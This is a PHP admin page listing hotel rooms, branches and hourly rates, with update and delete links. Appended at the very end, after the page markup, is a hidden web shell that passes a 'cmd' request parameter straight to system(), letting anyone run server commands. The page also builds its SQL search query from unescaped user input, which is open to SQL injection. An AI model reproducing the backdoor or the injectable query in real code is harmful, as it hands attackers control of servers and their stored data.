<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['ulroom_list'] == '') 
		{
			$_SESSION['ulroom_list'] = $_SESSION["ulname"];
			$modulename = 'room_list';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/	
		
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$search_text = '';
		$search_text = $_POST["search_text"];	
		
		if(isset($_GET['search_text']))
		{
			if ($_GET['search_text'])
			{
				$search_text = $_GET['search_text'];
			}
		}	
		
		$myblid = $_SESSION['myblid'];
		$myadmin = $_SESSION['myadmin'];
		
		$querydb  = "SELECT 
					 * 
				   FROM 
					 room_type a, room_list b, branch_list c
				   WHERE
				     a.rtid = b.rtid and
				   	 b.blid = c.blid and
					 b.rlname LIKE '%$search_text%' ";
					 
		if ($myblid != '') 
		{
			$querydb  = $querydb . "and c.blid = '$myblid' ";
		}					 
		
		$querydb  = $querydb . " 
				   ORDER BY 
					 c.blname, a.rtname, b.rlname ";
		$resultdb = mysql_query($querydb);
		echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Premium Rooms</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
<?php
/*
<form method="post" action="index.php?body=room_list_dbase">
Filter By Room Name
<INPUT TYPE="TEXT" NAME="search_text" VALUE="<?php print($search_text); ?>" SIZE="25" MAXLENGTH="50">
<input type="submit" value="Filter" />
</form>									
*/
?>
Table Information
									</td>
									<td align="right">
<a title="Add a new entry?" href="index.php?body=room_list_addeditdel&mybox=add">
Add Record
</a>
									</td>
								</tr>
							</table>	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th width="20%">Branch</th>
										<th>Locale</th>
										<th>Room No.</th>
										<th>Room Type</th>
										<th>Gold Room</th>
										<th>Room Name</th>
										<th>Daily Rate</th>
										<th>3 Hour Rate</th>
										<th>6 Hour Rate</th>
										<th>12 Hour Rate</th>
										<th>Active</th>
										<th>User/Stamp</th>
										<th>Status</th>
                                    </tr>
                                </thead>
                                <tbody>
								
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	print("<tr>");

	print("<td align=\"left\" valign=\"middle\">$rowdb[blname]</td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[blkey]</td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[rlkey]</td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[rtname]</td>\n");
	print("<td align=\"left\" valign=\"middle\"><strong>$rowdb[rlgoldroom]</strong> </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[rlname] </td>\n");
	print("<td align=\"right\" valign=\"middle\">" . number_format($rowdb[rlrate],2) . "</td>\n");
	print("<td align=\"right\" valign=\"middle\">" . number_format($rowdb[rlrate3hr],2) . "</td>\n");
	print("<td align=\"right\" valign=\"middle\">" . number_format($rowdb[rlrate6hr],2) . "</td>\n");
	print("<td align=\"right\" valign=\"middle\">" . number_format($rowdb[rlrate12hr],2) . "</td>\n");
	print("<td align=\"center\" valign=\"middle\">$rowdb[rlactive]  </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[rluser]  <br>" .date('m/d/Y h:i:s A', strtotime($rowdb[rlstamp])). "</td>\n");

	print("<td align=\"CENTER\" valign=\"middle\">[ <a title=\"Update entry?\" href=\"index.php?body=room_list_addeditdel&mybox=edit&rlid=$rowdb[rlid]\"> Update </a> ] 
		<br><br>
		[ <a title=\"Delete this entry?\" href=\"index.php?body=room_list_addeditdel&mybox=del&rlid=$rowdb[rlid]\"> Delete </a> ] </td>");

	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>